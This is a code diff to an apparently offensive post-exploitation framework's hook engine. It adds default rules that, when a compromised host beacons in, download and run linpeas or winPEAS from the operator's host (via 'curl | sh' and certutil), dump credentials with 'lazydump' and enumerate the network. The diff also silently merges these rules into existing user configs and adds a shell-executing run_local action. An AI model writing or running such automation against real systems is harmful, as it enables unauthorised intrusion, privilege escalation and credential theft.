@@ -177,6 +177,51 @@ DEFAULT_RULES: list[dict[str, Any]] = [
         ],
         "cooldown_seconds": 120,
     },
+    {
+        "name": "auto-privesc-on-beacon-linux",
+        "trigger": {"event": "beacon_connected", "platform": "linux"},
+        "actions": [
+            {"type": "notify", "message": "Foothold obtained on Linux host {ip}. Queuing linpeas enumeration."},
+            {"type": "run_command", "command": "curl -s http://{lhost}:8000/linpeas.sh | sh"},
+        ],
+        "cooldown_seconds": 600,
+    },
+    {
+        "name": "auto-privesc-on-beacon-windows",
+        "trigger": {"event": "beacon_connected", "platform": "windows"},
+        "actions": [
+            {"type": "notify", "message": "Foothold obtained on Windows host {ip}. Queuing winPEAS enumeration."},
+            {"type": "run_command", "command": "certutil -urlcache -f http://{lhost}:8000/winPEASx64.exe C:\\Windows\\Temp\\w.exe && C:\\Windows\\Temp\\w.exe"},
+        ],
+        "cooldown_seconds": 600,
+    },
+    {
+        "name": "auto-crystal-ball-on-peas-output",
+        "trigger": {"event": "command_executed", "command_contains": "linpeas"},
+        "actions": [
+            {"type": "notify", "message": "linpeas output received from {ip}. Run crystal_ball --auto to analyse."},
+        ],
+        "cooldown_seconds": 300,
+    },
+    {
+        "name": "auto-crystal-ball-on-winpeas-output",
+        "trigger": {"event": "command_executed", "command_contains": "winpeas"},
+        "actions": [
+            {"type": "notify", "message": "winpeas output received from {ip}. Run crystal_ball --auto to analyse."},
+        ],
+        "cooldown_seconds": 300,
+    },
+    {
+        "name": "auto-loot-on-owned",
+        "trigger": {"event": "host_owned"},
+        "actions": [
+            {"type": "notify", "message": "Host {ip} is OWNED. Dumping credentials and discovering network."},
+            {"type": "run_command", "command": "lazydump"},
+            {"type": "run_command", "command": "netstat -an | findstr LISTENING || ss -tlnp"},
+            {"type": "run_command", "command": "arp -a || ip neigh show"},
+        ],
+        "cooldown_seconds": 0,
+    },
 ]
 
 _VALID_EVENTS = frozenset({
@@ -250,6 +295,16 @@ class HookEngine:
         try:
             data = json.loads(path.read_text())
             self._rules = [HookRule(**r) for r in data]
+            existing_names = {r["name"] for r in data if isinstance(r, dict)}
+            new_rules: list[dict[str, Any]] = []
+            for dr in DEFAULT_RULES:
+                if isinstance(dr, dict) and dr.get("name") not in existing_names:
+                    self._rules.append(HookRule(**dr))
+                    new_rules.append(dr)
+            if new_rules:
+                data.extend(new_rules)
+                path.write_text(json.dumps(data, indent=2))
+                log.info("Merged %d new default hook rule(s)", len(new_rules))
         except (json.JSONDecodeError, TypeError) as exc:
             log.warning("Failed to load rules from %s: %s", path, exc)
             self._rules = [HookRule(**r) for r in DEFAULT_RULES]
@@ -308,6 +363,11 @@ class HookEngine:
 
         Supports field-level matching: if the trigger specifies ``port: 80``,
         it only matches when ``context.port == 80``.
+
+        Suffix keys:
+            ``key_contains``: substring match (case-insensitive).
+            ``key``: exact match (case-insensitive for strings).
+            ``key`` as list: context value must be in the list (case-insensitive for strings).
         """
         rule_event = rule_trigger.get("event", "")
         if rule_event != event:
@@ -316,12 +376,29 @@ class HookEngine:
         for key, value in rule_trigger.items():
             if key == "event":
                 continue
+
+            if key.endswith("_contains"):
+                base_key = key[:-len("_contains")]
+                ctx_val = str(context.get(base_key, "")).lower()
+                search_val = str(value).lower()
+                if ctx_val.find(search_val) < 0:
+                    return False
+                continue
+
             if key not in context:
                 return False
+
+            ctx_val = context[key]
             if isinstance(value, list):
-                if context[key] not in value:
+                if isinstance(ctx_val, str):
+                    if ctx_val.lower() not in [str(v).lower() for v in value]:
+                        return False
+                elif ctx_val not in value:
                     return False
-            elif context[key] != value:
+            elif isinstance(ctx_val, str) and isinstance(value, str):
+                if ctx_val.lower() != value.lower():
+                    return False
+            elif ctx_val != value:
                 return False
 
         return True
@@ -365,6 +442,13 @@ class HookEngine:
             log.info("[hook] %s", message)
             return message
 
+        if action_type == "run_local":
+            command = action.get("command", "")
+            if command:
+                cmd_resolved = self._resolve_placeholders(command, context)
+                return self._execute_local_command(cmd_resolved)
+            return None
+
         log.debug("Unknown action type: %s", action_type)
         return None
 
@@ -376,6 +460,18 @@ class HookEngine:
                 {"command": command, "client_id": client_id}, context
             )
 
+        return self._execute_local_command(command)
+
+    @staticmethod
+    def _execute_local_command(command: str) -> Any:
+        """Run a command locally via subprocess.
+
+        Args:
+            command: Shell command string to execute.
+
+        Returns:
+            Captured stdout, stderr, or None on failure.
+        """
         import subprocess
 
         try:
@@ -383,11 +479,11 @@ class HookEngine:
                 command, shell=True, capture_output=True, text=True, timeout=30
             )
             log.info(
-                "[hook] command: %s -> exit=%d", command, result.returncode
+                "[hook] local command: %s -> exit=%d", command, result.returncode
             )
             return result.stdout or result.stderr
         except Exception as exc:
-            log.warning("[hook] command failed: %s -> %s", command, exc)
+            log.warning("[hook] local command failed: %s -> %s", command, exc)
             return None
 
     def _execute_cred_reuse(self, context: dict[str, Any]) -> Any:
